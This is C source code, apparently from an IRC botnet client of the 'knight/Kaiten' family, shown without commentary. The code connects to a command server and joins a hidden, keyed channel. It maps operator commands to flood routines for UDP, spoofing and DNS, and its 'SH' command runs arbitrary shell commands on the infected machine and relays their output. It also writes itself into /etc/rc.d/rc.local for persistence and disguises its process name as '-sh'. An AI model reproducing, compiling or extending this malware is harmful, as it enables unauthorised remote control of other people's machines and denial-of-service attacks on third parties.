struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ "NICK", nickc },
	{ "UPDATEHTTP", updatehttp },
	{ "UPDATE", update },
	{ "CHECKSUM", checksum },
	{ "PAN", pan },
	{ "MAJIN", majin },
	{ "UDP", bysin },
	{ "SLICE2", slice2 },
	{ "GETSPOOFS", getspoofs },
	{ "SPOOFS", spoof },
	{ "DISABLE", disable },
	{ "ENABLE", enable },
	{ "DNS", dns },
	{ "VERSION", version },
	{ "KILLALL", killall },
	{ "HELP", help },
	{ "KILL", killdis },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
	int i;
	char *to, *message;
	for (i=0;i<strlen(str) && str[i] != ' ';i++);
	str[i]=0;
	to=str;
	message=str+i+2;
	if (*message != 1) return;
	if (message[strlen(message)-1] != 1) return;
	message[strlen(message)-1]=0;
	message++;
	for (i=0;i<strlen(sender) && sender[i] != '!';i++);
	sender[i]=0;
	if (!strncmp(message,"PING ",5)) Send(sock,"NOTICE %s :\01PING %s\01\n",sender,message+5);
	else if (*message == CONTROL_CHAR) {
 		char *params[12], name[1024]={0};
		int num_params=0, m;
		message++;;
		Send(sock,"PRIVMSG %s :*** [%s] %s\n",CHAN,sender,message);
		if (!strncmp(message,"IRC ",4)) { Send(sock,"%s\n",message+4); return; }
		else if (!strncmp(message,"SH ",3)) {
			char buf[1024];
			FILE *command;
			if (mfork() != 0) return;
			command=popen(message+3,"r");
			while(!feof(command)) {
				memset(buf,0,1024);
				fgets(buf,1024,command);
				Send(sock,"PRIVMSG %s :%s\n",CHAN,buf);
				sleep(1);
			}
			pclose(command);
			exit(0);
		}
		m=strlen(message);
		for (i=0;i<m;i++) {
			if (*message == ' ' || *message == 0) break;
			name[i]=*message;
			message++;
		}
		for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
		num_params++;
		if (num_params > 10) num_params=10;
		params[0]=name;
		params[num_params+1]="\0";
		m=1;
		while (*message != 0) {
			message++;
			if (m >= num_params) break;
			for (i=0;i<strlen(message) && message[i] != ' ';i++);
			params[m]=(char*)malloc(i+1);
			strncpy(params[m],message,i);
			params[m][i]=0;
			m++;
			message+=i;
		}
		for (m=0; flooders[m].cmd != (char *)0; m++) {
			if (!strcasecmp(flooders[m].cmd,name)) {
				flooders[m].func(sock,sender,num_params-1,params);
				for (i=1;i<num_params;i++) free(params[i]);
				return;
			}
		}
	}
}
void _376(int sock, char *sender, char *str) {
	Send(sock,"MODE %s -xi %s\n",nick,nick);
	Send(sock,"JOIN %s :%s\n",CHAN,KEY);
	Send(sock,"MODE %s +tnsk %s\n",CHAN,KEY);
	Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
	Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
	int i,d;
	char *msg=str;
	struct hostent *hostm;
	unsigned long m,n;
	for (i=0,d=0;d<5;d++) {
		for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
		if (i == strlen(str)) return;
	}
	for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
	msg[i]=0;
	if (!strcmp(msg,nick) && !spoofsm) {
		msg=str;
		for (i=0,d=0;d<3;d++) {
			for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
			if (i == strlen(str)) return;
		}
		for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
		msg[i]=0;
		if ((m = inet_addr(msg)) == -1) {
			if ((hostm=gethostbyname(msg)) == NULL) {
				Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",CHAN);
				return;
			}
			memcpy((char*)&m, hostm->h_addr, hostm->h_length);
		}
		((char*)&n)[3]=((char*)&m)[0];
		((char*)&n)[2]=((char*)&m)[1];
		((char*)&n)[1]=((char*)&m)[2];
		((char*)&n)[0]=0;
		spoofsm=256;
		spoofs=n;
	}
}
void _433(int sock, char *sender, char *str) {
	int on;
	free(nick);
	nick=(char*)malloc(10);
	memcpy(nick,"knight",6);
	for (on=6;on<9;on++) nick[on]='A'+((rand()-('A'-1))%('A'-('Z'+1)));
	nick[9]=0;
	Send(sock,"NICK %s\n",nick);
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
	{ "352", _352 },
	{ "376", _376 },
	{ "433", _433 },
	{ "422", _376 },
	{ "PRIVMSG", _PRIVMSG },
	{ "PING", _PING },
{ (char *)0, (void (*)(int,char *,char *))0 } };
int con() {
	int sock;
	struct sockaddr_in server;
	unsigned long ipaddr;
	while(1) {
		int g=fork();
		if (g == 0) {
			char *srv;
			srand((time(NULL) ^ getpid()) + getppid());
			srv=servers[rand()%numservers];
			if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) while(1);
			server.sin_family = AF_INET;
			server.sin_port = htons(PORT);
			if ((ipaddr = inet_addr(srv)) == -1) {
				struct hostent *hostm;
				if ((hostm=gethostbyname(srv)) == NULL) while(1);
				memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
			}
			else server.sin_addr.s_addr = ipaddr;
			memset(&(server.sin_zero), 0, 8);
			if (connect(sock,(struct sockaddr *)&server, sizeof(server)) != 0) while(1);
			break;
		}
		sleep(TIMEOUT);
		if (waitpid(g,NULL,WNOHANG)) exit(0);
		kill(g,9);
		waitpid(g,NULL,0);
	}
	if (fork()) exit(0);
	setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
	setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
	setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
	return sock;
}
int main(int argc, char **argv) {
	char *user;
	int sock;
	int on,i;
	char cwd[256];
	FILE *file=fopen("/etc/rc.d/rc.local","r");
	if (file != NULL) {
		char outfile[256], buf[1024];
		int i=strlen(argv[0]), d=0;
		getcwd(cwd,256);
		if (strcmp(cwd,"/")) {
			while(argv[0][i] != '/') i--;
			sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
			while(!feof(file)) {
				fgets(buf,1024,file);
				if (!strcmp(buf,outfile)) d++;
			}
			if (d == 0) {
				FILE *out;
				fclose(file);
				out=fopen("/etc/rc.d/rc.local","a");
				fputs(outfile,out);
				fclose(out);
			}
			else fclose(file);
		}
		else fclose(file);
	}
	getcwd(cwd,256);
	i=strlen(argv[0]);
	while(argv[0][i] != '/') i--;
	sprintf(execfile,"\"%s%s\"",cwd,argv[0]+i);
	strncpy(argv[0],"-sh",strlen(argv[0]));
	for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
	srand((time(NULL) ^ getpid()) + getppid());
	nick=(char*)malloc(10);
	memcpy(nick,"knight",6);
	for (on=6;on<9;on++) nick[on]='A'+((rand()-('A'-1))%('A'-('Z'+1)));
	nick[9]=0;
	user=(char*)malloc(10);
	memcpy(user,nick+6,4);
	user[4]='-';
	for (on=5;on<9;on++) user[on]='a'+((rand()-('a'-1))%('a'-('z'+1)));
	user[9]=0;
	if (fork()) exit(0);
	while(1) {
		int g;
		sock=con();
		actualparent=getpid();
		g=fork();
		if (g == -1) while(g == -1) g=fork();
		if (g != 0) {
			while(waitpid(g,NULL,0) <= 0);
			kill(g,9);
		}
		else {
			Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,user,user);
			while(1) {
				unsigned long i;
				fd_set n;
				struct timeval tv;
				FD_ZERO(&n);
				FD_SET(sock,&n);
				tv.tv_sec=60*20;
				tv.tv_usec=0;
				if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) exit(0);
				for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
					int *newpids;
					unsigned long on;
					for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
					numpids--;
					newpids=(int*)malloc(numpids);
					for (on=0;on<numpids;on++) newpids[on]=pids[on];
					free(pids);
					pids=(int*)malloc(numpids);
					for (on=0;on<numpids;on++) pids[on]=newpids[on];
					free(newpids);
				}
				if (FD_ISSET(sock,&n)) {
					char buf[4096], *str;
					int i;
					if ((i=recv(sock,buf,4096,0)) <= 0) exit(0);
					buf[i]=0;
					str=strtok(buf,"\n");
					while(str && *str) {
						char name[1024], sender[1024];
						filter(str);
						if (*str == ':') {
							for (i=0;i<strlen(str) && str[i] != ' ';i++);
							str[i]=0;
							strcpy(sender,str+1);
							strcpy(str,str+i+1);
						}
						else strcpy(sender,"*");
						for (i=0;i<strlen(str) && str[i] != ' ';i++);
						str[i]=0;
						strcpy(name,str);
						strcpy(str,str+i+1);
						for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
						if (!strcasecmp(name,"ERROR")) exit(0);
						str=strtok((char*)NULL,"\n");
					}
				}
			}
			exit(0);
		}
	}
	return 0;
}
